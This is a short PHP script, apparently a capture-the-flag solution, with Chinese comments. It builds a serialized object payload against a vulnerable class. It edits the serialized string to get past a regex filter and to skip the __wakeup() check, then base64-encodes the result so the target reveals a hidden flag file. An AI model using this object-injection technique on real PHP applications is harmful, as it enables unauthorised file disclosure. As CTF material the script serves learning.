<?php
class Demo {
  private $file = 'index.php';

  public function __construct($file) {
    $this->file = $file;
  }

  function __destruct() {
    echo @highlight_file($this->file, true);
  }

  function __wakeup() {
    if ($this->file != 'index.php') {
      //the secret is in the fl4g.php
      $this->file = 'index.php';
    }
  }
}
#先创建一个对象，自动调用__construct魔法函数
$obj = new Demo('fl4g.php');
#进行序列化
$a = serialize($obj);
#使用str_replace() 函数进行替换，来绕过正则表达式的检查
$a = str_replace('O:4:','O:+4:',$a);
#使用str_replace() 函数进行替换，来绕过__wakeup()魔法函数
$a = str_replace(':1:',':2:',$a);
#再进行base64编码
echo base64_encode($a);
?>
